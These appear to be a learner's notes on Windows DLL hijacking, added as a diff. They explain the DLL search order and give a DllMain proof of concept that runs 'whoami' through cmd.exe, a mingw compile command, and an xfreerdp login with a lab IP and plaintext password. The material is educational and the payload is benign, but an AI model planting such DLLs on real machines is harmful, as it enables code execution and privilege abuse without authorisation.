@@ -1,0 +1,51 @@
+DLL Hijacking
+
+DLL Hijacking is an effective technique that can allow you to inject code into an application. DDLs are files that store additional functions that support the main function of the .exe file.
+
+A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run. By this point, you may have an idea about the specific conditions required for a successful DLL hijacking attack. These can be summarized as;
+
+    An application that uses one or more DLL files.
+    A way to manipulate these DLL files. 
+
+If SafeDLLSearchMode is enabled, the search order is as follows:
+	The directory from which the application is loaded.
+	The system directory. Use the GetSystemDirectory function to get this path.
+	the 16-bit system directiory. No functions that obtain this.
+	The Windows Directory. Use GetWindowsDirectory function to get this path.
+	The current directory
+	The directories that are list in the PATH environment variable. This does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.
+
+If SafeDLLSearchMode is disabled:
+	The directory from which the application loaded.
+	The current directory.
+	The system directory. Use GetSystemDirectory
+	16-bit system directory.
+	The Windows Directory. Use GetWindowsDriectory
+	The directories that are list in the PATH environment variable. This does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.
+
+For example, if our application.exe requires the app.dll file to run, it will look for the app.dll file first in the directory from which it is launched. If this does not return any match for app.dll, the search will continue in the above-specified order. If the user privileges we have on the system allow us to write to any folder in the search order, we can have a possible DLL hijacking vulnerability. An important note is that the application should not be able to find the legitimate DLL before our modified DLL.
+
+
+***Finding DLL Hijacking Vulnerabilities
+
+Process Monitor can be used to find DLL hijacking vulns. 
+
+           
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+
+The mingw compiler can be used to generate the DLL file with the command given below:
+
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+You can easily install the Mingw compiler using the apt install gcc-mingw-w64-x86-64 command.
+
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.157.251 /u:Jack /p:'Password11'
